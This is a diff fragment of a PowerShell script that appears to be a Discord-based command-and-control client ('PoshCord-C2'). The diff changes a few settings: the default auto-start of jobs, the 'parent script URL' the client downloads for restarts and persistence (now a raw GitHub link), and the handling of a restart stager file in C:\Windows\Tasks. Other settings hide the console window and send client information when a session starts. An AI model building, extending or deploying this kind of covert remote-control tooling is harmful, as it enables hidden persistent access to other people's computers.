@@ -24,17 +24,16 @@ $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window whil
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
 
-$defaultstart = 1  # Option to start all jobs automatically upon running
+$defaultstart = 0  # Option to start all jobs automatically upon running
 if ($auto -eq 'n'){
 	$defaultstart = 0 
 }
 
-$global:parent = "is.gd/bwdcc2" # parent script URL (for restarts and persistance)
+$global:parent = "https://raw.githubusercontent.com/ThatCyanDev/uncreativeName9000/refs/heads/testing/PoshCord-C2-main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 
-# remove restart stager (if present)
+# Set InfoOnConnect to 0 (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
     $InfoOnConnect = 0
-    rm -path "C:\Windows\Tasks\service.vbs" -Force
 }
 $version = "1.5.1" # Check version number
 $response = $null
